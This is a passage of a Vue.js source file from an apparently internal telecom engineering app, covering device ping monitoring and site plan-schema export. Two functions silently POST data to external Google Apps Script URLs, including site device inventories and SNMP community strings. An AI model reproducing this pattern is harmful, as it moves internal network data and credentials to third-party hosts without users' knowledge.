      fetch('https://script.google.com/macros/s/AKfycbzmM_kE0O7VjZcGijRPkmnwq3vsADjVdaKk9jOmtI7P4bcjwpGiVpzM7QLg1deraDtV-w/exec',{
        method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
        body:JSON.stringify({...payload,api_filter:'5x5'})
      });
    }catch(error){
      
    };
  };
  
  function getSitesToCacheIfNotPresent({tasks,sites}){
    const sites_ids=[...Object.values(tasks).reduce((ids,task)=>{
      const {site_id}=task;
      if(!sites[site_id]){
        ids.add(site_id)
      };
      return ids;
    },new Set())].forEach(site_id=>{
      getSiteAndSaveToCache(site_id);
    });
  };
  
  async function getSiteAndSaveToCache(site_id){
    if(!site_id){return};
    try{
      const response=await httpGet(buildUrl("search_ma",{pattern:site_id},"/call/v1/search/"));
      if(response.type==='error'){return};
      selectNodeDuAsSiteAndSave(site_id,response.data);
    }catch(error){
      
    };
    
    function selectNodeDuAsSiteAndSave(site_id,response_data){
      if(!response_data){return};
      if(!app?.$cache?.setItem){return};
      if(!site_id){return};
      if(Array.isArray(response_data)){
        app.$cache.setItem(`getSite/${site_id}`,response_data.find(({type})=>type.toUpperCase()==='ДУ')||response_data[0]);
      }else{
        app.$cache.setItem(`getSite/${site_id}`,response_data);
      }
    }
  };
};













Vue.component('SiteExt',{
  template:`<div class="display-contents">
    <link-block :actionIcon="open_ext?'up':'down'" icon="card" text="дополнительно" type="large" @block-click="open_ext=!open_ext"/>
    <div v-show="open_ext" class="padding-left-right-16px">
      <SitePlanDownload v-bind="$props"/>
    </div>
    <devider-line />
    <template v-if="!entrance_id">
      <link-block :actionIcon="open_pings?'up':'down'" icon="factors" text="доступность" type="large" @block-click="open_pings=!open_pings">
        <div slot="postfix" class="display-flex align-items-center gap-4px">
          <span v-if="loadingSomePing" class="ic-20 ic-loading rotating tone-500"></span>
          <template v-else>
            <div v-if="countOfflineOrError" class="display-flex align-items-center gap-2px">
              <span class="font--13-500 tone-500">{{countOfflineOrError}}</span>
              <span class="ic-20 ic-warning main-orange"></span>
            </div>
            <div v-if="countOnline" class="display-flex align-items-center gap-2px">
              <span class="font--13-500 tone-500">{{countOnline}}</span>
              <span class="ic-20 ic-status main-green"></span>
            </div>
          </template>
        </div>
      </link-block>
      <div v-show="open_pings" class="padding-left-right-16px">
        <SitePings v-bind="{site,site_id}" @count-not-online="countOfflineOrError=$event" @count-online="countOnline=$event" @loading-some="loadingSomePing=$event"/>
      </div>
      <devider-line />
    </template>
  </div>`,
  props:{
    site:{type:Object,default:null,required:true},
    site_id:{type:String,default:'',required:true},
    entrances:{type:Array,default:()=>([]),required:true},
    entrance_id:{type:String,default:''},
  },
  data:()=>({
    open_ext:false,
    open_pings:false,
    countOfflineOrError:false,
    countOnline:false,
    loadingSomePing:false,
  }),
});

Vue.component('LedsBarChart',{//bar chart
  template:`<div class="display-flex flex-wrap gap-1px">
    <div v-for="(item,key) of Object.values(items)" :key="key" :style="getStyle(item)" :title="item?.title">{{item?.text||''}}</div>
  </div>`,
  props:{
    items:{type:[Object,Array],default:()=>[]},
    color:{type:String,default:'#5642bd'},
    width:{type:[String,Number],default:12},
    height:{type:[String,Number],default:3},
  },
  methods:{
    getStyle(item){
      return {
        width:(item?.width||this.width)+'px',
        height:(item?.height||this.height)+'px',
        borderRadius:'2px',
        background:item?.color||this.color,
        ...item?.style
      }
    }
  }
});

Vue.component('PingLed',{//add emits
  template:`<div class="display-flex align-items-center cursor-pointer" @click.stop="ping">
    <span class="ic-20" :class="pingLoading?'ic-loading rotating tone-500':pingResultClass"></span>
  </div>`,
  props:{
    mr_id:{type:[String,Number],required:true},
    ip:{type:String,required:true},
    noPingOnCreated:{type:Boolean,default:false},
  },
  created(){
    if(!this.noPingOnCreated){
      this.ping();
    };
  },
  watch:{
    'pingLoading'(loading){
      const {mr_id,ip}=this;
      this.$emit('loading',loading)
    },
    'pingResult'(result){
      if(this.pingLoading){return};
      if(!result){return};
      const {mr_id,ip}=this;
      this.$emit('on-result',result)
    }
  },
  computed:{
    ...mapGetters({
      getPingResult:'ping/getPingResult',
      getPingLoading:'ping/getPingLoading',
    }),
    pingResult(){
      const {mr_id,ip}=this;
      return this.getPingResult(mr_id,ip);
    },
    pingLoading(){const {mr_id,ip}=this;return this.getPingLoading(mr_id,ip)||false},
    state(){return this.pingResult?.state},//public
    pingResultClass(){
      switch(this.state){
        case 'error':return 'ic-warning main-orange';
        case 'online':return 'ic-status main-green';
        case 'offline':return 'ic-status main-red';
        default:return 'ic-status tone-500';
      };
    }
  },
  methods:{
    ...mapActions({
      doPing:'ping/doPing',
    }),
    async ping(){//public
      const {mr_id,ip}=this;
      return await this.doPing({mr_id,ip});
    }
  },
});

Vue.component('BtnSq',{//new btn
  template:`<button name="BtnSq" class="button-sq--medium" style="border-radius:4px;color:#5642bd;border:1px solid;cursor:pointer;display:flex;justify-content:center;" :style="{width:size+'px',minWidth:size+'px',height:size+'px'}" type="button" v-on="$listeners">    
    <slot><span :class="iconClass"></span></slot>    
  </button>`,
  props:{
    size:{type:String,default:'20'},
    iconSize:{type:String,default:'16'},//12,14,16,20,24,80
    icon:{type:String,default:'refresh'},
    loading:{type:Boolean,default:false},
  },
  computed:{//перенести классы всместо button-sq--medium
    iconClass(){
      return `ic-${ this.iconSize } ic-${this.loading?'loading rotating':this.icon}`
    },
  },
});

Vue.component('SitePings',{//pings chart
  template:`<div name="SitePings">
    <div class="display-grid row-gap-2px col-gap-4px" style="grid-template-columns:repeat(2,max-content) 1fr">
      
      <template v-if="networkElementsCount">
        <BtnSq :loading="loadingSome" @click="pingAll" :disabled="running"/>
        <div class="display-flex gap-4px" style="grid-column: span 2">
          <button-main @click="clear" label="clear" buttonStyle="outlined" size="medium" class="width-50px height-20px border-radius-4px"/>
          <button-main @click="start" label="start" :loading="running" :disabled="running" buttonStyle="contained" size="medium" class="width-50px height-20px border-radius-4px"/>
          <button-main @click="stop" label="stop" buttonStyle="outlined" size="medium" class="width-50px height-20px border-radius-4px"/>
          <div class="font--13-500 tone-500">{{count||''}}</div>
        </div>
      </template>
      
      <template v-for="({ip,mr_id,modelText}) in networkElementsFiltered">
        <PingLed :key="ip" v-bind="{ip,mr_id}" noPingOnCreatedddd ref="PingLeds" @on-result="onResult(ip,$event)" @loading="$set(loads,ip,$event)"/>
        <div class="font--13-500">{{ip}}</div>
        <div class="font--13-500 tone-500">{{modelText}}</div>
        
        <div></div>
        <LedsBarChart class="position-relative" style="grid-column: span 2;bottom:7px;" :items="results[ip]"/>
      </template>
      
    </div>
  </div>`,
  props:{
    site:{type:Object,default:null,required:true},
    site_id:{type:String,default:'',required:true}
  },
  data:()=>({
    loads:{},
    results:{},
    timer:null,
    timeout:1000,
    max_count:100,
    count:0,
    running:false,
    states:{},
  }),
  created(){
    const {site_id}=this;
    this.getSiteNetworkElements({site_id});
  },
  watch:{
    'countNotOnline'(countNotOnline){
      this.$emit('count-not-online',countNotOnline);
    },
    'countOnline'(countOnline){
      this.$emit('count-online',countOnline);
    },
    'loadingSome'(loadingSome){
      this.$emit('loading-some',loadingSome);
    },
  },
  computed:{
    node_id(){return this.site.node_id},
    ...mapGetters({
      getNetworkElementsBySiteId:'site/getNetworkElementsBySiteId',
    }),
    networkElements(){return this.getNetworkElementsBySiteId(this.site_id)},
    networkElementsFiltered(){
      return select(this.networkElements,{
        site_id:this.site_id,
        node_id:this.node_id,
        ip:(ip)=>!!ip,
        sysObjectID:(sysObjectID,item)=>{
          const {vendor,model}=item;
          item.modelText=getModelText(vendor,model,sysObjectID);
          return true
        },
      }) 
    },
    networkElementsCount(){return Object.values(this.networkElementsFiltered).length},
    loadingSome(){
      return Object.values(this.loads).some(v=>v)
    },
    countNotOnline(){
      return Object.values(this.states).filter(v=>v!=='online').length
    },
    countOnline(){
      return Object.values(this.states).filter(v=>v==='online').length
    }
  },
  methods:{
    ...mapActions({
      getSiteNetworkElements:'site/getSiteNetworkElements',
    }),
    async pingAll(){
      const pings=(this.$refs.PingLeds||[]).map(led=>led.ping());
      return await Promise.allSettled(pings);
    },
    clear(){
      this.stop();
      this.results={};
      this.max_count=100;
      this.count=0;
    },
    start(){
      if(this.running){return};
      this.running=true;
      this.next();
    },
    next(){
      this.timer=setTimeout(async ()=>{
        this.max_count--;
        this.count++;
        await this.pingAll();
        if(this.max_count<=0){
          this.stop();
        }else if(this.running){
          this.next();
        }
      },this.timeout);
    },
    stop(){
      this.running=false;
      clearTimeout(this.timer);
    },
    onResult(ip,result){
      if(!ip||!result){return};
      this.$set(this.states,ip,result.state);
      if(this.running){
        this.storeResult(ip,result);
      }
    },
    storeResult(ip,result){
      if(!this.results[ip]){this.$set(this.results,ip,{})};
      const {state,ms,date}=result;
      const item={
        color:state==='online'?'#20a471':state==='offline'?'#e44656':state==='error'?'#f16b16':'#918f8f',
      };
      if(state==='online'){
        //item.width=ms*12,
        item.title=ms
      };
      this.$set(this.results[ip],date,item);
    }
  },
});


Vue.component('SitePlanDownload',{//плансхема
  template:`<div name="SitePlanDownload">
    <div class="display-flex align-items-center gap-4px justify-content-flex-end">
      <span id="loader_generatePL" class="spd-loader" style="display:none;"></span>
      <input type="button" id="btn_generatePL" disabled @click="createSchematicPlan(site_id)" style="font-family:arial;font-size:8pt;padding:1px;opacity:1;" value="план-схема">
      <input type="button" id="btn_generatePL_woTS" @click="createSchematicPlan(site_id,true)" style="font-family:arial;font-size:8pt;padding:1px;opacity:1;" value="план-схема без ТС">
    </div>
  </div>`,
  props:{
    site:{type:Object,default:null,required:true},
    site_id:{type:String,default:'',required:true},
    entrances:{type:Array,default:()=>([]),required:true},
    entrance_id:{type:String,default:''},
  },
  data:()=>({
    openOptions:false,
  }),
  mounted(){
    createStyleElement('SitePlanDownload-css',`
    .spd-loader{width:18px;height:18px;border:2px dashed cadetblue;border-left-color:crimson;border-right-color:coral;border-top-color:cornflowerblue;border-radius:50%;animation:spd-loader-spinner 0.99s linear infinite;}
    @keyframes spd-loader-spinner{to{transform:rotate(360deg)}}
    `)
  },
  computed:{},
  methods:{
    async getSite(site_id,hideTS=false){
      console.log('getSite('+site_id+','+hideTS+')');
      const result={
        [site_id]:{
          nodes:[],
          _sites:{},
          _nodes:{},
          entrances:{},
          racks:{},
          devices:{},
          unmount_devices:{},
          ppanels:{},
        },
      };
      const gets=[];
      const dict={};

      return Promise.allSettled([
        this.$cache.getItem(`building/${site_id}`)?Promise.resolve(this.$cache.getItem(`building/${site_id}`)):httpGet(buildUrl('search_ma',{pattern:site_id},'/call/v1/search/')),
        this.$cache.getItem(`site_flat_list/${site_id}`)?Promise.resolve(this.$cache.getItem(`site_flat_list/${site_id}`)):httpGet(buildUrl('site_flat_list',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`devices/${site_id}`)?Promise.resolve(this.$cache.getItem(`devices/${site_id}`)):httpGet(buildUrl('devices',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`get_unmount_devices/${site_id}`)?Promise.resolve(this.$cache.getItem(`get_unmount_devices/${site_id}`)):httpGet(buildUrl('get_unmount_devices',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`site_rack_list/${site_id}`)?Promise.resolve(this.$cache.getItem(`site_rack_list/${site_id}`)):httpGet(buildUrl('site_rack_list',{site_id},'/call/v1/device/')),
        this.$cache.getItem(`patch_panels/${site_id}`)?Promise.resolve(this.$cache.getItem(`patch_panels/${site_id}`)):httpGet(buildUrl('patch_panels',{site_id,without_tree:true},'/call/v1/device/')),
      ]).then((responses)=>{
        const results=[];
        for(const response of responses){
          results.push(response.status==='fulfilled'?(response.value.length?response.value:[response.value]):[]);
        };
        return {
          nodes:results[0],
          entrances:results[1],
          devices:results[2],
          unmount_devices:results[3],
          racks:results[4],
          ppanels:results[5],
        };
      }).then(results=>{
        for(const name in results){
          switch(name){
            case 'nodes':
              result[site_id].nodes=results[name].length?(results[name][0].type!=='building_list'?[results[name][0].data]:results[name][0].data):[];

              gets.push(httpGet(buildUrl('get_nioss_object',{object_id:site_id,object:'site'},'/call/nioss/')));
              dict[gets.length-1]='_sites/'+site_id+'/nioss';

              for(const node of result[site_id].nodes){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:node.uzel_id,object:'node'},'/call/nioss/')));
                dict[gets.length-1]='_nodes/'+node.uzel_id+'/nioss';
              };
            break;
            case 'entrances':
              for(const entrance of results[name].filter(item=>!item.nioss_error)){
                if(hideTS){
                  entrance.floor=entrance.floor.map(floor=>{
                    floor.flats=floor.flats.map(flat=>{
                      flat.subscribers=flat.subscribers.map(subscriber=>{
                        subscriber.account='x-xxx-xxxxxxx';
                        subscriber.services=subscriber.services.map(service=>{
                          service.msisdn='7xxxxxxxxxx';
                          return service;
                        });
                        return subscriber;
                      });
                      flat.services=flat.services.map(service=>{
                        service.msisdn='7xxxxxxxxxx';
                        return service;
                      });
                      return flat;
                    });
                    return floor;
                  });
                };
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:entrance.id,object:'entrance'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+entrance.id+'/nioss';

                result[site_id][name][entrance.id]=entrance;
              };
            break;
            case 'devices':
              for(const device of results[name]){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:device.nioss_id,object:'device'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+device.nioss_id+'/nioss';

                if(['ETH','OP','CPE','FAMP','SBE','FTRM','IP','MPLS','OLT','MBH'].includes(device.name.split('_')[0].split('-')[0])){
                  gets.push(httpGet(buildUrl('search_ma',{pattern:device.name},'/call/v1/search/')));
                  dict[gets.length-1]=name+'/'+device.nioss_id;
                };

                gets.push(httpGet(buildUrl('get_dismantled_devices',{device_name:device.name},'/call/v1/device/')));
                dict[gets.length-1]=name+'/'+device.nioss_id+'/devices';

                if(['ETH','MPLS','MBH','OLT'].includes(device.name.split('_')[0].split('-')[0])){
                  if(!hideTS){
                    gets.push(httpGet(buildUrl('device_port_list',{device:device.name},'/call/device/')));
                    dict[gets.length-1]=name+'/'+device.nioss_id+'/ports';
                    /*
                    gets.push(httpGet(buildUrl('get_history_conn_point_list',{device_id:643651,region_id:54},'/call/v1/device/')));
                    dict[gets.length-1]=name+'/'+device.nioss_id+'/conn_point_list';
                    */
                  };
                };

                result[site_id][name][device.nioss_id]=device;
              };
            break;
            case 'unmount_devices':
              for(const device of results[name]){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:device.device_nioss_id,object:'device'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+device.device_nioss_id+'/nioss';

                result[site_id][name][device.device_nioss_id]={
                  site_id:device.site_id,
                  uzel:{id:device.uzel_id,name:device.uzel_name},
                  nioss_id:device.device_nioss_id,
                  name:device.device_name,
                  ip:device.ip_address,
                  display:device.display_name,
                  ne_status:device.ne_status,
                  snmp:{version:device.snmp_version,community:device.snmp_community},
                  region:results['devices'][0]?.region||{code:"",id:0,location:"",mr_id:0,name:""},
                  access_mode:null,
                  description:"",
                  discovery:{date:"",type:"",status:"",text:""},
                  firmware:"",
                  firmware_revision:null,
                  model:"",
                  system_object_id:"",
                  type:"",
                  upstream_ne:"",
                  vendor:"",
                };
              };
            break;
            case 'racks':
              for(const rack of results[name].filter(item=>!item.nioss_error)){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:rack.id,object:'rack'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+rack.id+'/nioss';

                result[site_id][name][rack.id]=rack;
              };
            break;
            case 'ppanels':
              for(const pp of results[name].filter(item=>!item.nioss_error)){
                gets.push(httpGet(buildUrl('get_nioss_object',{object_id:pp.id,object:'plint'},'/call/nioss/')));
                dict[gets.length-1]=name+'/'+pp.id+'/nioss';

                result[site_id][name][pp.id]=pp;
              };
            break;
            default:break;
          };
        };
        return Promise.allSettled(gets);
      }).then(responses=>{
        responses.map((response,index)=>{
          const value=response.status==='fulfilled'?response.value:{};
          const path=dict[index].split('/');
          result[site_id][path[0]][path[1]]={
            ...result[site_id][path[0]][path[1]],
            ...path.length>2?{[path[2]]:value}:value,
          };
        });
        return result;
      });
    },
    async createSchematicPlan(site_id,hideTS=true){
      //document.getElementById('btn_generatePL').setAttribute('disabled','disabled');
      document.getElementById('btn_generatePL_woTS').setAttribute('disabled','disabled');
      document.getElementById('loader_generatePL').style.display='inline-table';

      const siteObj=await this.getSite(site_id,hideTS);
      const user=this.$root.username||'<username>';
      const site_name=siteObj[site_id].nodes[0].name;
      const address=siteObj[site_id].nodes[0].address;
      const date=new Date();
      const title=site_name+' '+date.toLocaleDateString().match(/(\d|\w){1,4}/g).join('.')+' '+date.toLocaleTimeString().match(/(\d|\w){1,4}/g).join('-')+' '+date.getTime().toString(16)+' '+user;
      const bodyObj={
        username:user,
        node_id,
        sitename:site_name,site_name,
        address,
        siteid:site_id,site_id,
        title,
        json:JSON.stringify(siteObj,null,2),
        html:'',
      };

      if(!FIX_test_DEV){
        if(user&&user!=='<username>'){
          fetch('https://script.google.com/macros/s/AKfycbzyyWn_TMArC9HcP2NzwGhgKUCMJK2QBQ3BEY3U8c37pQJS5fHh3TKz0Xya9V5Eq1Sm-g/exec',{
            method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json;charset=utf-8'},
            body:JSON.stringify(bodyObj)
          });
        }else{
          return;
        };
      }else{
        const json=new Blob([bodyObj.json],{type:'text/plain'});
        const a=document.createElement('a');
        a.href=URL.createObjectURL(json);
        a.download=bodyObj.title+'.json';
        a.click();
        a.remove();
      };

      //document.getElementById('btn_generatePL').removeAttribute('disabled');
      document.getElementById('btn_generatePL_woTS').removeAttribute('disabled');
      document.getElementById('loader_generatePL').style.display='none';
    },
  }
});

























































































